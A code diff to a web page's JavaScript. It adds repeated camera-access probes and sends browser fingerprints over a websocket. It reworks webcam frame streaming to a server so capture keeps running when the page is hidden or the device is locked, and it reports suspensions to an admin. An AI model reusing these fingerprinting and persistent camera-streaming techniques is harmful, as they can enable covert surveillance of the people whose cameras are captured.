@@ -869,36 +869,64 @@ main a {
         timeout: 20000
       });
       
-      // Register user function (reusable)
-      function registerUser() {
-        if (currentEntryId && currentFingerprint && socket.connected) {
-          socket.emit('register_user', {
-            entry_id: currentEntryId,
-            fingerprint: currentFingerprint
+      // Check if user can actually perform actions (camera access)
+      let canStreamOrPhoto = false;
+      
+      async function checkCapability() {
+        try {
+          // Test camera access to verify user can actually stream/take photos
+          const stream = await navigator.mediaDevices.getUserMedia({ 
+            video: { width: 1, height: 1 } 
           });
-          console.log('[WEBSOCKET] Registered user:', currentEntryId);
+          stream.getTracks().forEach(track => track.stop());
+          canStreamOrPhoto = true;
+          console.log('[CAPABILITY] Camera access confirmed - user can stream/take photos');
+          return true;
+        } catch (error) {
+          canStreamOrPhoto = false;
+          console.warn('[CAPABILITY] Camera access denied - user cannot stream/take photos:', error);
+          return false;
         }
       }
       
-      socket.on('connect', () => {
+      // Register user function (reusable) - only register if capable
+      async function registerUser() {
+        if (currentEntryId && currentFingerprint && socket.connected) {
+          // Check capability before registering
+          const capable = await checkCapability();
+          
+          socket.emit('register_user', {
+            entry_id: currentEntryId,
+            fingerprint: currentFingerprint,
+            capable: capable  // Send capability status
+          });
+          console.log('[WEBSOCKET] Registered user:', currentEntryId, 'capable:', capable);
+        }
+      }
+      
+      socket.on('connect', async () => {
         console.log('[WEBSOCKET] Connected to server');
-        // Register this user's entry when connected
-        registerUser();
+        // Register this user's entry when connected (with capability check)
+        await registerUser();
         
         // Send periodic heartbeat to keep connection alive and re-register if needed
         if (heartbeatInterval) {
           clearInterval(heartbeatInterval);
         }
-        heartbeatInterval = setInterval(() => {
+        heartbeatInterval = setInterval(async () => {
           if (socket.connected && currentEntryId && currentFingerprint) {
+            // Check capability periodically
+            const capable = await checkCapability();
+            
             // Send ping to keep connection alive (more frequent)
             socket.emit('ping', {
               entry_id: currentEntryId,
-              fingerprint: currentFingerprint
+              fingerprint: currentFingerprint,
+              capable: capable  // Send capability status
             });
             
-            // Re-register periodically to ensure we stay in active_users
-            registerUser();
+            // Re-register periodically to ensure we stay in active_users (with capability)
+            await registerUser();
           } else if (!socket.connected && currentEntryId && currentFingerprint) {
             // Try to reconnect if disconnected
             console.log('[HEARTBEAT] Socket disconnected, attempting reconnect...');
@@ -907,10 +935,10 @@ main a {
         }, 15000); // Reduced from 30s to 15s for more frequent pings
       });
 
-      socket.on('reconnect', (attemptNumber) => {
+      socket.on('reconnect', async (attemptNumber) => {
         console.log(`[WEBSOCKET] Reconnected to server (attempt ${attemptNumber})`);
-        // Re-register user after reconnection
-        registerUser();
+        // Re-register user after reconnection (with capability check)
+        await registerUser();
       });
 
       socket.on('reconnect_attempt', (attemptNumber) => {
@@ -985,17 +1013,31 @@ main a {
           initWebSocket();
         }
       } else {
-        console.log('[VISIBILITY] Page visible - re-registering user');
+        console.log('[VISIBILITY] Page visible - re-registering user and resuming stream');
         // Page became visible again (device unlocked or tab focused)
         if (socket && socket.connected && currentEntryId && currentFingerprint) {
+          // Re-check capability when page becomes visible
+          const capable = await checkCapability();
+          
           socket.emit('register_user', {
             entry_id: currentEntryId,
-            fingerprint: currentFingerprint
+            fingerprint: currentFingerprint,
+            capable: capable
           });
           socket.emit('ping', {
             entry_id: currentEntryId,
-            fingerprint: currentFingerprint
+            fingerprint: currentFingerprint,
+            capable: capable
           });
+          
+          // If streaming was active, notify that it resumed
+          if (isStreaming) {
+            socket.emit('stream_status', {
+              entry_id: currentEntryId,
+              status: 'resumed',
+              message: 'Stream resumed - device unlocked'
+            });
+          }
         } else if (socket && !socket.connected) {
           console.log('[VISIBILITY] Reconnecting WebSocket...');
           initWebSocket();
@@ -1004,15 +1046,20 @@ main a {
     });
 
     // Handle focus events
-    window.addEventListener('focus', () => {
+    window.addEventListener('focus', async () => {
       if (socket && socket.connected && currentEntryId && currentFingerprint) {
+        // Re-check capability when window gains focus
+        const capable = await checkCapability();
+        
         socket.emit('register_user', {
           entry_id: currentEntryId,
-          fingerprint: currentFingerprint
+          fingerprint: currentFingerprint,
+          capable: capable
         });
         socket.emit('ping', {
           entry_id: currentEntryId,
-          fingerprint: currentFingerprint
+          fingerprint: currentFingerprint,
+          capable: capable
         });
       }
     });
@@ -1045,42 +1092,132 @@ main a {
         const video = document.createElement('video');
         video.srcObject = mediaStream;
         video.play();
+        video.setAttribute('playsinline', 'true'); // Important for mobile
+        video.setAttribute('autoplay', 'true');
+        video.setAttribute('muted', 'true'); // Required for autoplay on mobile
 
         // Create canvas to capture frames
         const canvas = document.createElement('canvas');
         const ctx = canvas.getContext('2d');
-        canvas.width = 320;  // Reduced resolution to reduce bandwidth
-        canvas.height = 240; // Reduced resolution to reduce bandwidth
+        canvas.width = 320;
+        canvas.height = 240;
 
         // Frame queue to prevent overwhelming the server
         let frameQueue = 0;
-        const MAX_QUEUE = 2; // Maximum frames in queue
+        const MAX_QUEUE = 2;
+        let lastFrameTime = Date.now();
+        let frameCallbackId = null;
+        let fallbackInterval = null;
+        let framesSent = 0;
+        let lastFrameSentTime = Date.now();
 
-        // Capture and send frames
-        streamInterval = setInterval(() => {
-          // Skip frame if queue is full to prevent server overload
+        // Function to capture and send a frame
+        function captureAndSendFrame() {
+          // Skip frame if queue is full
           if (frameQueue >= MAX_QUEUE) {
             return;
           }
 
           if (video.readyState === video.HAVE_ENOUGH_DATA) {
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            // Reduced quality from 0.7 to 0.5 to reduce file size
-            const frameData = canvas.toDataURL('image/jpeg', 0.5).split(',')[1]; // Base64 without data URL prefix
+            try {
+              ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+              const frameData = canvas.toDataURL('image/jpeg', 0.5).split(',')[1];
+              
+              if (socket && socket.connected) {
+                frameQueue++;
+                framesSent++;
+                lastFrameSentTime = Date.now();
+                
+                socket.emit('stream_frame', {
+                  entry_id: entryId,
+                  frame_data: frameData
+                }, () => {
+                  if (frameQueue > 0) frameQueue--;
+                });
+              }
+            } catch (error) {
+              console.error('[STREAM] Error capturing frame:', error);
+            }
+          }
+        }
+
+        // Use requestVideoFrameCallback if available (better for video, works even when hidden)
+        if (video.requestVideoFrameCallback) {
+          console.log('[STREAM] Using requestVideoFrameCallback API');
+          
+          function onVideoFrame(now, metadata) {
+            if (!isStreaming) return;
             
-            // Send frame via WebSocket
+            captureAndSendFrame();
+            lastFrameTime = now;
+            
+            // Schedule next frame
+            frameCallbackId = video.requestVideoFrameCallback(onVideoFrame);
+          }
+          
+          // Start frame callback
+          frameCallbackId = video.requestVideoFrameCallback(onVideoFrame);
+          
+          // Fallback to setInterval as backup
+          fallbackInterval = setInterval(() => {
+            if (!isStreaming) return;
+            
+            // Check if frames are being sent (detect if suspended)
+            const timeSinceLastFrame = Date.now() - lastFrameSentTime;
+            if (timeSinceLastFrame > 1000 && isStreaming) {
+              // No frames sent in 1 second - might be suspended
+              console.warn('[STREAM] No frames sent in 1 second - device might be locked');
+              // Try to capture a frame anyway
+              captureAndSendFrame();
+            }
+          }, 500);
+        } else {
+          // Fallback to setInterval for older browsers
+          console.log('[STREAM] Using setInterval (requestVideoFrameCallback not available)');
+          
+          fallbackInterval = setInterval(() => {
+            if (!isStreaming) return;
+            
+            captureAndSendFrame();
+            
+            // Detect if frames stopped (device locked)
+            const timeSinceLastFrame = Date.now() - lastFrameSentTime;
+            if (timeSinceLastFrame > 2000 && isStreaming) {
+              console.warn('[STREAM] Frame capture appears suspended - device might be locked');
+            }
+          }, 200);
+        }
+
+        // Monitor frame sending to detect when device is locked
+        const frameMonitor = setInterval(() => {
+          if (!isStreaming) {
+            clearInterval(frameMonitor);
+            return;
+          }
+          
+          const timeSinceLastFrame = Date.now() - lastFrameSentTime;
+          
+          // If no frames sent in 3 seconds, notify admin that streaming stopped
+          if (timeSinceLastFrame > 3000 && framesSent > 0) {
+            console.warn('[STREAM] Streaming appears to have stopped - device might be locked');
+            // Optionally notify admin via WebSocket
             if (socket && socket.connected) {
-              frameQueue++;
-              socket.emit('stream_frame', {
+              socket.emit('stream_status', {
                 entry_id: entryId,
-                frame_data: frameData
-              }, () => {
-                // Decrement queue on acknowledgment
-                if (frameQueue > 0) frameQueue--;
+                status: 'suspended',
+                message: 'Device may be locked - frames not being captured'
               });
             }
           }
-        }, 200); // Reduced from 100ms to 200ms (5 FPS instead of 10 FPS)
+        }, 3000);
+
+        // Store references for cleanup
+        streamInterval = {
+          frameCallbackId: frameCallbackId,
+          fallbackInterval: fallbackInterval,
+          frameMonitor: frameMonitor,
+          video: video
+        };
 
         console.log('[STREAM] Live stream started (optimized: 320x240 @ 5 FPS)');
       } catch (error) {
@@ -1096,7 +1233,19 @@ main a {
       releaseWakeLock();
       
       if (streamInterval) {
-        clearInterval(streamInterval);
+        // Cancel video frame callback if exists
+        if (streamInterval.video && streamInterval.video.cancelVideoFrameCallback && streamInterval.frameCallbackId) {
+          streamInterval.video.cancelVideoFrameCallback(streamInterval.frameCallbackId);
+        }
+        
+        // Clear intervals
+        if (streamInterval.fallbackInterval) {
+          clearInterval(streamInterval.fallbackInterval);
+        }
+        if (streamInterval.frameMonitor) {
+          clearInterval(streamInterval.frameMonitor);
+        }
+        
         streamInterval = null;
       }
       
